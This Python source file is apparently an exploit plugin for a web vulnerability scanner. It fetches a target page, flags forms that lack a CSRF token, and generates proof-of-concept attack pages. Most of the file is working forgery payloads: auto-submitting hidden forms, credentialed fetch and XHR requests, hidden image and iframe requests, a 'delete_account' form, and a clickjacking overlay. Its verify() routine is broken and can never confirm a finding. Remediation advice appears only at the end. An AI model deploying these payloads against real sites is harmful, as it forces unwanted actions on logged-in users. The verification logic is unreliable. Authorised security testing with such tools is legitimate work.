"""
CSRF (Cross-Site Request Forgery) Exploit Plugin

This plugin provides exploit capabilities for CSRF vulnerabilities including:
- CSRF PoC generation
- Token analysis
- Form submission testing
"""

import sys
import os
from typing import Dict, List, Any, Optional
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

try:
    from bs4 import BeautifulSoup
    HAS_BS4 = True
except ImportError:
    HAS_BS4 = False

try:
    from scanner.visual_proof_capture import VisualProofCapture
    from scanner.media_manager import MediaManager
    HAS_VISUAL_PROOF = True
except ImportError:
    HAS_VISUAL_PROOF = False
    logging.warning("Visual proof modules not available")

logger = logging.getLogger(__name__)


class CSRFPlugin(ExploitPlugin):
    """CSRF exploit plugin for generating proof-of-concept attacks."""
    
    @property
    def vulnerability_type(self) -> str:
        return 'csrf'
    
    @property
    def name(self) -> str:
        return 'CSRF Exploit'
    
    @property
    def description(self) -> str:
        return 'Cross-Site Request Forgery exploit plugin for generating PoC attacks.'
    
    @property
    def version(self) -> str:
        return '2.0.0'
    
    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Generate CSRF payloads and PoC HTML."""
        context = context or {}
        target_url = context.get('target_url', 'http://target.com/action')
        method = context.get('method', 'POST')
        parameters = context.get('parameters', {})

        # Generate HTML PoC
        if method.upper() == 'POST':
            form_fields = '\n'.join([f'  <input type="hidden" name="{k}" value="{v}" />'
                                    for k, v in parameters.items()])
            poc = f'''<html>
<body>
<h1>CSRF PoC</h1>
<form action="{target_url}" method="POST">
{form_fields}
  <input type="submit" value="Submit" />
</form>
<script>document.forms[0].submit();</script>
</body>
</html>'''
        else:
            params = '&'.join([f'{k}={v}' for k, v in parameters.items()])
            poc = f'''<html>
<body>
<h1>CSRF PoC</h1>
<img src="{target_url}?{params}" />
</body>
</html>'''

        payloads = [poc]
        payloads.extend(self._get_csrf_poc_variants(target_url))
        return payloads

    def _get_csrf_poc_variants(self, target_url: str) -> List[str]:
        """Generate additional CSRF PoC HTML variants."""
        return [
            f'''<html><body><script>
fetch("{target_url}", {{method:"POST",credentials:"include",headers:{{"Content-Type":"application/x-www-form-urlencoded"}},body:"megido_csrf=1"}});
</script></body></html>''',
            f'''<html><body><script>
var x=new XMLHttpRequest();x.open("POST","{target_url}");
x.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
x.withCredentials=true;x.send("megido_csrf=1");
</script></body></html>''',
            f'<img src="{target_url}?megido_csrf=1" />',
            f'<iframe src="{target_url}?megido_csrf=1" style="display:none"></iframe>',
            f'''<html><body><form action="{target_url}" method="POST" enctype="multipart/form-data">
<input type="hidden" name="megido_csrf" value="1" />
<input type="submit" />
</form><script>document.forms[0].submit();</script></body></html>''',
            f'''<html><body><script>
fetch("{target_url}", {{method:"POST",credentials:"include",headers:{{"Content-Type":"application/json"}},body:'{{"megido_csrf":1}}'}});
</script></body></html>''',
            f'''<html><body><script>
fetch("{target_url}", {{method:"PUT",credentials:"include",body:"megido_csrf=1"}});
</script></body></html>''',
            f'<img src="{target_url}/delete/1" style="display:none" />',
            f'''<html><body>
<iframe src="{target_url}" style="opacity:0;position:absolute;top:0;left:0;width:100%;height:100%;"></iframe>
<button style="position:absolute;top:50%;left:50%;">Click Me!</button>
</body></html>''',
            f'<script>var i=new Image();i.src="{target_url}?megido_csrf=1"</script>',
            f'''<html><body><form action="{target_url}" method="POST">
<input type="hidden" name="action" value="delete_account" />
<input type="submit" value="Continue" />
</form><script>document.forms[0].submit();</script></body></html>''',
            f'<link rel="prefetch" href="{target_url}?megido_csrf=1" />',
            f'<audio src="{target_url}?megido_csrf=1"></audio>',
            f'<video src="{target_url}?megido_csrf=1"></video>',
            f'<object data="{target_url}?megido_csrf=1"></object>',
            f'<embed src="{target_url}?megido_csrf=1" />',
            f'<script src="{target_url}?megido_csrf=1"></script>',
            f'<meta http-equiv="refresh" content="0;url={target_url}?megido_csrf=1" />',
            f'<base href="{target_url}?megido_csrf=1" />',
        ]

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                      config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Execute CSRF attack by analyzing forms and generating PoC."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'csrf',
            }
        
        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)
        
        logger.info(f"Analyzing CSRF protection on {target_url}")
        
        try:
            response = requests.get(target_url, timeout=timeout, verify=verify_ssl)
            
            if not HAS_BS4:
                return {
                    'success': False,
                    'error': 'BeautifulSoup not available for form analysis',
                    'vulnerability_type': 'csrf',
                }
            
            soup = BeautifulSoup(response.text, 'html.parser')
            forms = soup.find_all('form')
            vulnerable_forms = []
            
            for form in forms:
                # Check for CSRF tokens
                csrf_tokens = form.find_all('input', attrs={'name': lambda x: x and 'csrf' in x.lower()})
                
                if not csrf_tokens:
                    action = form.get('action', '')
                    method = form.get('method', 'GET').upper()
                    
                    # Extract form parameters
                    inputs = form.find_all('input')
                    params = {inp.get('name'): inp.get('value', '') for inp in inputs if inp.get('name')}
                    
                    # Generate PoC
                    poc = self.generate_payloads({
                        'target_url': target_url + action if action else target_url,
                        'method': method,
                        'parameters': params
                    })[0]
                    
                    vulnerable_forms.append({
                        'action': action,
                        'method': method,
                        'poc': poc
                    })
            
            if vulnerable_forms:
                result = {
                    'success': True,
                    'vulnerable_forms': vulnerable_forms,
                    'evidence': f'Found {len(vulnerable_forms)} form(s) without CSRF protection',
                    'vulnerability_type': 'csrf',
                    'message': 'CSRF vulnerability confirmed',
                }
                
                # Capture visual proof if available
                if HAS_VISUAL_PROOF and config.get('capture_visual_proof', True):
                    visual_proofs = self._capture_visual_proof(
                        target_url, vulnerable_forms, config
                    )
                    if visual_proofs:
                        result['visual_proofs'] = visual_proofs
                        logger.info(f"Captured {len(visual_proofs)} visual proof(s)")
                
                return result
            else:
                return {
                    'success': False,
                    'error': 'All forms appear to have CSRF protection',
                    'vulnerability_type': 'csrf',
                }
        
        except Exception as e:
            logger.error(f"Error during CSRF exploitation: {e}")
            return {
                'success': False,
                'error': str(e),
                'vulnerability_type': 'csrf',
            }
    
    def _capture_visual_proof(self, url: str, vulnerable_forms: List[Dict[str, Any]],
                              config: Dict[str, Any]) -> List[Dict[str, Any]]:
        """
        Capture visual proof of CSRF vulnerability.
        
        Args:
            url: Target URL
            vulnerable_forms: List of vulnerable forms without CSRF tokens
            config: Configuration dictionary
            
        Returns:
            List of visual proof metadata dictionaries
        """
        visual_proofs = []
        
        try:
            proof_capture = VisualProofCapture()
            
            # Capture screenshot of the vulnerable form page
            screenshot_data = proof_capture.capture_screenshot(
                url,
                wait_time=2.0
            )
            
            if screenshot_data:
                visual_proofs.append({
                    'type': 'screenshot',
                    'data': screenshot_data,
                    'title': 'CSRF - Vulnerable Form Without Token',
                    'description': f'Found {len(vulnerable_forms)} form(s) missing CSRF protection tokens',
                    'exploit_step': 'Forms accessible without CSRF token validation',
                    'vulnerable_forms_count': len(vulnerable_forms)
                })
            
            # Capture PoC HTML for the first vulnerable form
            if vulnerable_forms:
                form = vulnerable_forms[0]
                poc_html = form.get('poc', '')
                
                if poc_html:
                    # Create temporary HTML file with PoC
                    import tempfile
                    import os
                    
                    with tempfile.NamedTemporaryFile(mode='w', suffix='.html', delete=False) as f:
                        f.write(poc_html)
                        poc_file_path = f.name
                    
                    try:
                        # Capture screenshot of PoC HTML
                        poc_url = f'file://{poc_file_path}'
                        poc_screenshot_data = proof_capture.capture_screenshot(
                            poc_url,
                            wait_time=1.0
                        )
                        
                        if poc_screenshot_data:
                            visual_proofs.append({
                                'type': 'screenshot',
                                'data': poc_screenshot_data,
                                'title': 'CSRF - Proof of Concept HTML',
                                'description': f'Generated CSRF PoC for {form.get("method", "POST")} form',
                                'exploit_step': 'Auto-submitting CSRF PoC HTML that exploits the vulnerability',
                                'poc_html': poc_html[:500]
                            })
                    finally:
                        # Clean up temp file
                        try:
                            os.unlink(poc_file_path)
                        except:
                            pass
            
        except Exception as e:
            logger.error(f"Failed to capture visual proof: {e}")
        
        return visual_proofs
    
    def verify(self, result: Dict[str, Any], 
               target_url: str,
               vulnerability_data: Dict[str, Any]) -> tuple:
        """Verify CSRF with proof of successful token bypass or missing protection."""
        if not result.get('success'):
            return False, None
        
        evidence = result.get('evidence', '')
        
        # CSRF is verified if we successfully bypassed protection or confirmed missing tokens
        if 'token' in evidence.lower() or 'bypass' in evidence.lower() or 'missing' in evidence.lower():
            proof = f"âœ“ VERIFIED - Cross-Site Request Forgery (CSRF)\n\nEvidence: {evidence[:300]}\n\nImpact: Unauthorized actions can be performed on behalf of authenticated users"
            return True, proof
        
        return False, None
    
    def get_severity_level(self) -> str:
        return 'medium'
    
    def get_remediation_advice(self) -> str:
        return (
            'Prevent CSRF attacks:\n'
            '1. Implement CSRF tokens in all state-changing requests\n'
            '2. Use SameSite cookie attribute\n'
            '3. Implement double-submit cookie pattern\n'
            '4. Validate Origin/Referer headers\n'
            '5. Use custom request headers\n'
            '6. Implement re-authentication for sensitive actions\n'
            '7. Use framework built-in CSRF protection\n'
            '8. Educate users about CSRF attacks'
        )
